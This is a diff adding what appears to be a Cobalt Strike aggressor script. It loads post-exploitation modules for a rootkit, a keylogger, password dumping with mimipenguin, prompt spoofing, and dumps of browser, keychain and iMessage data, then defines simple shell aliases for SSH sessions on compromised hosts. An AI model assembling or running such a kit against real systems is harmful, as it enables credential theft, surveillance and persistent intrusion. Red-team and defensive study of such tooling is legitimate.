@@ -1,0 +1,60 @@
+
+include(script_resource("jobs/cc2_jobs.cna"));
+include(script_resource("proxy/frp/cc2_frp.cna"));
+include(script_resource("rootkit/auth/cc2_ssh.cna"));
+include(script_resource("rootkit/auth/cc2_auth.cna"));
+include(script_resource("scanner/ServerScan/serverscan.cna"));
+include(script_resource("gather/password/mimipenguin/cc2_mimipenguin.cna"));
+include(script_resource("gather/prompt/osx/cc2_prompt_spoof_dylib.cna"));
+include(script_resource("gather/keylogger/osx/keylogger_osx2.cna"));
+include(script_resource("gather/browser/safari_dump.cna"));
+include(script_resource("gather/browser/chrome_dump.cna"));
+include(script_resource("gather/keychain/keychain_dump.cna"));
+include(script_resource("gather/message/iMessage_dump.cna"));
+
+
+
+# Useful aliases, placed in kitloader because I always have this loaded
+# from 'Und3rf10w - KitLoader.cna'
+
+ssh_alias ls {
+    if(!$2){
+        bshell($1, "ls -la");
+    } else {
+        bshell($1, "ls -la $2");
+    }
+}
+
+ssh_command_register("ls", "Lists files", "Use: ls [folder]\n\nLists files in a folder");
+
+ssh_alias cat {
+    if ($2){
+        bshell($1, "cat $2");
+    } else {
+        berror($1, "Error: You must specify a file");
+    }
+}
+ssh_command_register("cat", "Displays the contents of a file", "Use: cat [file]\n\nDisplays the contents of [file]");
+
+ssh_alias tail {
+    if ($2){
+        bshell($1, "tail $2");
+    } else {
+        berror($1, "Error: You must specify a file");
+    }
+}
+ssh_command_register("tail", "Print the last 10 lines of a file", "Use: tail [file]\n\nDisplays last 10 lines of [file]");
+
+ssh_alias head {
+    if ($2){
+        bshell($1, "head $2");
+    } else {
+        berror($1, "Error: You must specify a file");
+    }
+}
+ssh_command_register("head", "Print the first 10 lines of a file", "Use: head [file]\n\nDisplays first 10 lines of [file]");
+
+ssh_alias ps {
+    bshell($1, "ps aux");
+}
+ssh_command_register("ps", "Show process list", "Use: ps\n\nShows a list of processes");
